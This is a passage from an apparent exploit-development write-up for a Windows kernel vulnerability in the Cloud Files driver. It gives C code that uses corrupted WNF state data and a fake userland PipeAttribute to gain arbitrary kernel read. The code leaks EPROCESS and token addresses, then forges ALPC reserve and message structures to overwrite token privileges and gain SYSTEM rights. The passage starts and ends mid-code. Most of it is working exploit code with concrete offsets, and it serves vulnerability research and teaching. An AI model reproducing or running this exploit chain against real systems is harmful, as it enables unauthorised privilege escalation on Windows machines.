</span></span></code></pre></div><p>To read from a <code>PipeAttribute</code>, we can call <code>NtFsControlFile</code> with 0x110038 as the control code. This would return <code>AttributeValue</code> of size <code>AttributeValueSize</code> to the user. Note that if the user calls <code>NtFsControlFile</code> with control code 0x11003c again to modify <code>AttributeValue</code>, the old <code>PipeAttribute</code> struct will be deallocated and a new one will take its place.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtFsControlFile</span>(WritePipeArr[i], NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>status, <span style="color:#ae81ff">0x110038</span>, PipeName, len, PipeData, <span style="color:#ae81ff">0x1000</span>);
</span></span></code></pre></div><p>On Windows, due to backwards compatibility, Supervisor Mode Access Prevention (SMAP) is not enabled. Hence, it is possible for the kernel to address data in userspace. In order to achieve arbitrary read, we can use the corrupted <code>_WNF_STATE_DATA</code> to perform an out-of-bounds write on the <code>Flink</code> pointer of the <code>LIST_ENTRY</code> of <code>PipeAttribute</code> so that it points to a fake <code>PipeAttribute</code> struct in userland. From there, we are able to set <code>AttributeValueSize</code> and <code>AttributeValue</code>, allowing us to read from any kernel address.</p>
<p>We can set up our fake <code>PipeAttribute</code> object in userland as such:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Set up fake userland pipe_attribute object 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)FakePipe2; <span style="color:#75715e">// Flink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span>  (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)pipe_leak; <span style="color:#75715e">// Blink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)FakePipeName; <span style="color:#75715e">// Attribute name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30</span>; <span style="color:#75715e">// Attribute value size -- LEAK SIZE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)ALPC_leak; <span style="color:#75715e">// Attribute value -- LEAK POINTER
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4545454545454545</span>; <span style="color:#75715e">// Data
</span></span></span></code></pre></div><p>And then use our second corrupted <code>_WNF_STATE_DATA</code> object to perform our overwrite of the <code>Flink</code> pointer of the adjacent <code>PipeAttribute</code> object in kernel memory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Using WNF object 1 to overwrite flink of pipe_attribute
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Using WNF object 1 to corrupt pipe_attribute</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(StateData, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(StateData)); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(StateData, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x200</span>); <span style="color:#75715e">// Just so that it is easier to see the object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(StateData <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xff0</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)FakePipe;
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtUpdateWnfStateData</span>(<span style="color:#f92672">&amp;</span>SecondStateNames[CorruptedWNFidx2], StateData, <span style="color:#ae81ff">0xff8</span>, NULL, NULL, <span style="color:#ae81ff">0xbeef</span>, NULL); 
</span></span></code></pre></div><p>This is how the memory layout looks like now:</p>
<p><img src="/images/exploiting-cldflt/memory6.jpg" alt="Memory 6"></p>
<p>We can now perform our arbitrary read. The first pointer that we would want to read from is the <code>_KALPC_RESERVE</code> pointer that we leaked previously. By reading from <code>_KALPC_RESERVE</code>, we are able to obtain a pointer to an <code>_ALPC_PORT</code> structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _ALPC_PORT
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _LIST_ENTRY PortListEntry;                                       <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_COMMUNICATION_INFO<span style="color:#f92672">*</span> CommunicationInfo;                     <span style="color:#75715e">//0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _EPROCESS<span style="color:#f92672">*</span> OwnerProcess;                                         <span style="color:#75715e">//0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To perform the leak:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Arbitrary read from corrupted pipe_attribute object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> CorruptedPipeIdx <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEATTR; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(PipeData, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(PipeData)); 
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtFsControlFile</span>(WritePipeArr[i], NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>status, <span style="color:#ae81ff">0x110038</span>, FakePipeName, (<span style="color:#a6e22e">strlen</span>(FakePipeName)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>), PipeData, <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Reached fake pipe_attribute in userland</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>            ALPC_port_leak <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData));
</span></span><span style="display:flex;"><span>            ALPC_handle_table <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData))[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            ALPC_message_leak <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData))[<span style="color:#ae81ff">3</span>]; 
</span></span><span style="display:flex;"><span>            CorruptedPipeIdx <span style="color:#f92672">=</span> i; 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] ALPC port leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ALPC_port_leak);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] ALPC handle table leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ALPC_handle_table); 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] ALPC message leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ALPC_message_leak);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>From the <code>_ALPC_PORT</code> structure, we are able to get the address of <code>EPROCESS</code>. As the ALPC port belongs to our current process, <code>EPROCESS</code> would be the struct for our current process. The pointer to token is at offset 0x4b8 from <code>EPROCESS</code>, and we can read from <code>EPROCESS</code> to obtain that.</p>
<p>To perform these leaks:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Leak EPROCESS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Leaking data in ALPC_port</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(PipeData, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(PipeData)); 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d8</span>; <span style="color:#75715e">// Attribute value size -- LEAK SIZE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)(ALPC_port_leak); <span style="color:#75715e">// Attribute value -- LEAK POINTER
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtFsControlFile</span>(WritePipeArr[CorruptedPipeIdx], NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>status, <span style="color:#ae81ff">0x110038</span>, FakePipeName, (<span style="color:#a6e22e">strlen</span>(FakePipeName)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>), PipeData, <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    EPROCESS_leak <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData))[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] EPROCESS leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, EPROCESS_leak); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Leak token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetCurrentProcessId</span>(); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Current PID: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(PipeData, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(PipeData)); 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa40</span>; <span style="color:#75715e">// Attribute value size -- LEAK SIZE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(FakePipe <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)(EPROCESS_leak); <span style="color:#75715e">// Attribute value -- LEAK POINTER
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtFsControlFile</span>(WritePipeArr[CorruptedPipeIdx], NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>status, <span style="color:#ae81ff">0x110038</span>, FakePipeName, (<span style="color:#a6e22e">strlen</span>(FakePipeName)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>), PipeData, <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    token_leak <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData))[<span style="color:#ae81ff">151</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFF0</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Leaked PID: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(PipeData))[<span style="color:#ae81ff">136</span>]); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Leaked token: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, token_leak);
</span></span></code></pre></div><h4 id="privilege-escalation">Privilege Escalation</h4>
<p>Now that we have the address of token, we can finally escalate privileges to obtain NT AUTHORITY\SYSTEM permissions!</p>
<p>Remember the first <code>_WNF_STATE_DATA</code> that we used to leak a pointer to <code>_KALPC_RESERVE</code> inside the ALPC handle table? We can use the same <code>_WNF_STATE_DATA</code> object to overwrite that pointer with a pointer to a fake <code>_KALPC_RESERVE</code> structure in userland. Inside the <code>_KALPC_RESERVE</code>, there is a pointer to <code>_KALPC_MESSAGE</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _KALPC_MESSAGE {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _LIST_ENTRY Entry;                                               <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> PortQueue;                                           <span style="color:#75715e">//0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> OwnerPort;                                           <span style="color:#75715e">//0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ETHREAD<span style="color:#f92672">*</span> WaitingThread;                                         <span style="color:#75715e">//0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            ULONG QueueType:<span style="color:#ae81ff">3</span>;                                              <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG QueuePortType:<span style="color:#ae81ff">4</span>;                                          <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG Canceled:<span style="color:#ae81ff">1</span>;                                               <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG Ready:<span style="color:#ae81ff">1</span>;                                                  <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG ReleaseMessage:<span style="color:#ae81ff">1</span>;                                         <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG SharedQuota:<span style="color:#ae81ff">1</span>;                                            <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG ReplyWaitReply:<span style="color:#ae81ff">1</span>;                                         <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG OwnerPortReference:<span style="color:#ae81ff">1</span>;                                     <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG ReceiverReference:<span style="color:#ae81ff">1</span>;                                      <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG ViewAttributeRetrieved:<span style="color:#ae81ff">1</span>;                                 <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG InDispatch:<span style="color:#ae81ff">1</span>;                                             <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ULONG InCanceledQueue:<span style="color:#ae81ff">1</span>;                                        <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        } s1;                                                               <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ULONG State;                                                        <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } u1;                                                                   <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LONG SequenceNo;                                                        <span style="color:#75715e">//0x2c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> _EPROCESS<span style="color:#f92672">*</span> QuotaProcess;                                     <span style="color:#75715e">//0x30
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        VOID<span style="color:#f92672">*</span> QuotaBlock;                                                   <span style="color:#75715e">//0x30
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> CancelSequencePort;                                  <span style="color:#75715e">//0x38
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> CancelQueuePort;                                     <span style="color:#75715e">//0x40
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LONG CancelSequenceNo;                                                  <span style="color:#75715e">//0x48
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _LIST_ENTRY CancelListEntry;                                     <span style="color:#75715e">//0x50
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _KALPC_RESERVE<span style="color:#f92672">*</span> Reserve;                                         <span style="color:#75715e">//0x60
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _KALPC_MESSAGE_ATTRIBUTES MessageAttributes;                     <span style="color:#75715e">//0x68
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> DataUserVa;                                                       <span style="color:#75715e">//0xb0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_COMMUNICATION_INFO<span style="color:#f92672">*</span> CommunicationInfo;                     <span style="color:#75715e">//0xb8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> ConnectionPort;                                      <span style="color:#75715e">//0xc0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ETHREAD<span style="color:#f92672">*</span> ServerThread;                                          <span style="color:#75715e">//0xc8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> WakeReference;                                                    <span style="color:#75715e">//0xd0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> WakeReference2;                                                   <span style="color:#75715e">//0xd8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> ExtensionBuffer;                                                  <span style="color:#75715e">//0xe0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG ExtensionBufferSize;                                          <span style="color:#75715e">//0xe8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _PORT_MESSAGE PortMessage;                                       <span style="color:#75715e">//0xf0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}; 
</span></span></code></pre></div><p>Inside <code>_KALPC_MESSAGE</code>, there are 2 fields that are of interest to us: <code>ExtensisonBuffer</code> and <code>ExtensionBufferSize</code>. When <code>NtAlpcSendWaitReceivePort</code> is called, data that is controllable by the user of size <code>ExtensionBufferSize</code> is written to <code>ExtensionBuffer</code>. To obtain arbitrary write, we can have our fake <code>_KALPC_RESERVE</code> structure point to a fake <code>_KALPC_MESSAGE</code> structure (also in userland), with <code>ExtensionBuffer</code> set to the location which we would like to do our write!</p>
<p><img src="/images/exploiting-cldflt/memory7.jpg" alt="Memory 7"></p>
<p>In this case, we will set <code>ExtensionBuffer</code> to token privileges (located at offset 0x40) and <code>ExtensionBufferSize</code> to 0x10, so that we can write 16 <code>\xff</code>s which would enable all privileges:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Using WNF object 1 to overwrite KALPC_RESERVE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(StateData, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(StateData)); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(StateData, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x200</span>); <span style="color:#75715e">// Just so that it is easier to see the object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(StateData <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xff0</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>)fakeKalpcReserve;
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtUpdateWnfStateData</span>(<span style="color:#f92672">&amp;</span>StateNames[CorruptedWNFidx], StateData, <span style="color:#ae81ff">0xff8</span>, NULL, NULL, <span style="color:#ae81ff">0xcafe</span>, NULL); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Overwriting token privs</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
</span></span><span style="display:flex;"><span>    ULONG DataLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
</span></span><span style="display:flex;"><span>    ALPC_MESSAGE<span style="color:#f92672">*</span> alpcMessage <span style="color:#f92672">=</span> (ALPC_MESSAGE<span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(ALPC_MESSAGE));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(alpcMessage, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(ALPC_MESSAGE));
</span></span><span style="display:flex;"><span>    alpcMessage<span style="color:#f92672">-&gt;</span>PortHeader.u1.s1.DataLength <span style="color:#f92672">=</span> DataLength;
</span></span><span style="display:flex;"><span>    alpcMessage<span style="color:#f92672">-&gt;</span>PortHeader.u1.s1.TotalLength <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PORT_MESSAGE) <span style="color:#f92672">+</span> DataLength;
</span></span><span style="display:flex;"><span>    alpcMessage<span style="color:#f92672">-&gt;</span>PortHeader.MessageId <span style="color:#f92672">=</span> (ULONG)g_hResource;
</span></span><span style="display:flex;"><span>    ULONG_PTR<span style="color:#f92672">*</span> pAlpcMsgData <span style="color:#f92672">=</span> (ULONG_PTR<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)alpcMessage <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(PORT_MESSAGE));
</span></span><span style="display:flex;"><span>    pAlpcMsgData[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>    pAlpcMsgData[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> portsCount; i<span style="color:#f92672">++</span>) {
